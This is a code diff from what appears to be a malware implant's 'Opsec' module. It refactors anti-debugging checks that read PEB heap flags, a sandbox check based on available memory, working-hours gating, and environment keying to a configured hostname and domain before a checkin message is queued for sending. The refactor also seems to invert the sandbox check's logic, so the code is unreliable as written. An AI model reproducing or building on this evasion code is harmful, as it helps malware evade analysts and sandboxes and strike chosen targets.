@@ -1,28 +1,23 @@
 #include <core/include/opsec.hpp>
 namespace Opsec {
 
-    VOID SeRuntimeCheck() {
+    BOOL SeRuntimeCheck() {
         HEXANE
 
-        do {
+        bool success = true;
 #ifndef DEBUG
-            Opsec::SeCheckDebugger();
-            if (ntstatus != ERROR_SUCCESS) {
-
-                Utils::Time::Timeout(SECONDS(1));
-                return_defer(ERROR_BAD_ENVIRONMENT);
-            }
+        if (Opsec::SeCheckDebugger()) {
+            Utils::Time::Timeout(SECONDS(1));
+            success_(false);
+        }
 #endif
-            Opsec::SeCheckSandbox();
-            if (ntstatus != ERROR_SUCCESS) {
-
-                Utils::Time::Timeout(SECONDS(1));
-                return_defer(ERROR_BAD_ENVIRONMENT);
-            }
-            break;
-        } while (TRUE);
+        if (Opsec::SeCheckSandbox()) {
+            Utils::Time::Timeout(SECONDS(1));
+            success_(false);
+        }
 
         defer:
+        return success;
     }
 
     BOOL CheckTime() {
@@ -36,23 +31,23 @@ namespace Opsec {
 
         if (Ctx->config.hours != 0) {
             if (!Utils::Time::InWorkingHours()) {
-                return FALSE;
+                return false;
             }
         }
 
-        return TRUE;
+        return true;
     }
 
-    VOID SeCheckDebugger() {
+    BOOL SeCheckDebugger() {
         HEXANE
 
-        PVOID heap_base             = { };
-        ULONG flags_offset          = 0;
-        ULONG force_flags_offset    = 0;
-        BOOL vista_or_greater       = Ctx->session.version >= WIN_VERSION_2008;
+        PVOID   heap_base               = { };
+        ULONG   flags_offset            = 0;
+        ULONG   force_flags_offset      = 0;
+        BOOL    vista_or_greater        = Ctx->session.version >= WIN_VERSION_2008;
 
-        BOOL m_x32                  = FALSE;
-        PPEB peb                    = PEB_POINTER;
+        BOOL m_x32  = FALSE;
+        PPEB peb    = PEB_POINTER;
 
         Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);
 
@@ -64,19 +59,17 @@ namespace Opsec {
         flags_offset 		= vista_or_greater ? 0x40 : 0x0C;
         force_flags_offset 	= vista_or_greater ? 0x44 : 0x10;
 #else
-        heap_base               = C_PTR(*R_CAST(ULONG_PTR*, R_CAST(PBYTE, peb) + 0x30));
-        flags_offset         = vista_or_greater ? 0x70 : 0x14;
-        force_flags_offset    = vista_or_greater ? 0x74 : 0x18;
+        heap_base           = C_PTR(*R_CAST(ULONG_PTR*, R_CAST(PBYTE, peb) + 0x30));
+        flags_offset        = vista_or_greater ? 0x70 : 0x14;
+        force_flags_offset  = vista_or_greater ? 0x74 : 0x18;
 #endif
-        auto HeapFlags          = R_CAST(ULONG_PTR*, S_CAST(PBYTE, heap_base) + flags_offset);
-        auto HeapForceFlags     = R_CAST(ULONG_PTR*, S_CAST(PBYTE, heap_base) + force_flags_offset);
+        auto HeapFlags      = R_CAST(ULONG_PTR*, S_CAST(PBYTE, heap_base) + flags_offset);
+        auto HeapForceFlags = R_CAST(ULONG_PTR*, S_CAST(PBYTE, heap_base) + force_flags_offset);
 
-        ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0))
-            ? ntstatus = (ERROR_DEVICE_ALREADY_ATTACHED)
-            : ntstatus = (ERROR_SUCCESS);
+        return ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0));
     }
 
-    VOID SeCheckSandbox() {
+    BOOL SeCheckSandbox() {
         // todo: check ACPI tables for vm vendors instead of just checking memory
         HEXANE
 
@@ -84,29 +77,23 @@ namespace Opsec {
         stats.dwLength = sizeof(stats);
 
         Ctx->win32.GlobalMemoryStatusEx(&stats);
-        stats.ullAvailPhys <= 4
-            ? ntstatus = ERROR_NOT_ENOUGH_MEMORY
-            : ntstatus = ERROR_SUCCESS;
+        return stats.ullAvailPhys > 4;
     }
 
-    VOID SeCheckEnvironment() {
+    BOOL SeCheckEnvironment() {
         // todo: add other information to the checkin message
         HEXANE
 
-        _stream *out = Stream::CreateStreamWithHeaders(TypeCheckin);
+        _stream         *out    = Stream::CreateStreamWithHeaders(TypeCheckin);
         IP_ADAPTER_INFO adapter = { };
 
-        char buffer[MAX_PATH] = { };
-        unsigned long length = MAX_PATH;
-
-        if (!out) {
-            return_defer(ERROR_NO_DATA);
-        }
+        char            buffer[MAX_PATH]    = { };
+        unsigned long   length              = MAX_PATH;
+        bool            success             = true;
 
         if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, R_CAST(LPSTR, buffer), &length)) {
-            if (x_strncmp(Ctx->config.hostname, buffer, x_strlen(Ctx->config.hostname)) != 0) {
-                return_defer(ERROR_BAD_ENVIRONMENT);
-            }
+
+            x_assertb(x_strncmp(Ctx->config.hostname, buffer, x_strlen(Ctx->config.hostname)) == 0);
             Stream::PackString(out, buffer);
 
         } else {
@@ -118,9 +105,8 @@ namespace Opsec {
 
         if (Ctx->transport.domain[0] != NULTERM) {
             if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, R_CAST(LPSTR, buffer), &length)) {
-                if (x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) != 0) {
-                    return_defer(ERROR_BAD_ENVIRONMENT);
-                }
+
+                x_assertb(x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) == 0);
                 Stream::PackString(out, buffer);
 
             } else {
@@ -150,6 +136,7 @@ namespace Opsec {
 
     defer:
         Dispatcher::OutboundQueue(out);
+        return success;
     }
 
     BOOL SeImageCheckArch(const _executable *const image) {
